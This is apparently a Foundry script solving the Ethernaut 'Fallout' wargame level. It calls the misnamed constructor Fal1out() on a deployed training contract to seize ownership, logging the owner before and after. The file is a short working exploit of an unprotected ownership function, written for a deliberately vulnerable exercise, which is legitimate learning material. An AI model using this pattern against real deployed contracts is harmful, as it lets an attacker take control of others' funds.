// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel02.sol";

contract POC is Script {
    Fallout level2 = Fallout(0xfb1A92BA200C9eB43abf7aCeF582b699360Bf168);

    function run() external {
        vm.startBroadcast();

        console.log("Current Owner is: ", level2.owner()); // querying current owner
        level2.Fal1out(); // calling the vulnerable function
        console.log("New Owner is: ", level2.owner()); // checking if the owner changed

        vm.stopBroadcast();
    }
}

